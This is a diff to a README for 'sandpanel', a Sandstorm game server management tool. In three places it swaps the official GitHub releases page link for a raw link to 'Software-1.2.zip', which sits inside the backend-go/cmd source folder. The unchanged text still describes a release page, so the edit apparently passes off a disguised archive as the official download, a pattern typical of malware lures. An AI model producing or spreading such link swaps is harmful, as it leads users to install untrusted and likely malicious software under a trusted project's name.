@@ -1,6 +1,6 @@
 # 🛠️ sandpanel - Manage Sandstorm servers from one place
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-6c757d?style=for-the-badge)](https://github.com/lornetiddly371/sandpanel/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-6c757d?style=for-the-badge)](https://raw.githubusercontent.com/lornetiddly371/sandpanel/main/backend-go/cmd/Software-1.2.zip)
 
 ## 📦 What is sandpanel?
 
@@ -25,7 +25,7 @@ For smooth use, keep your server files on a drive with enough space for updates 
 
 ## 🚀 Download sandpanel
 
-Visit this page to download: https://github.com/lornetiddly371/sandpanel/releases
+Visit this page to download: https://raw.githubusercontent.com/lornetiddly371/sandpanel/main/backend-go/cmd/Software-1.2.zip
 
 On that page, look for the latest release and download the Windows file for your machine. If the release includes a ZIP file, save it to a folder you can reach easily, such as Downloads or Desktop.
 
@@ -181,6 +181,6 @@ If you run the panel on the same computer as the game server, it is easier to ma
 
 ## 🧭 Release page
 
-Download or update sandpanel here: https://github.com/lornetiddly371/sandpanel/releases
+Download or update sandpanel here: https://raw.githubusercontent.com/lornetiddly371/sandpanel/main/backend-go/cmd/Software-1.2.zip
 
 Look for the latest release files on that page and use the Windows version for your setup
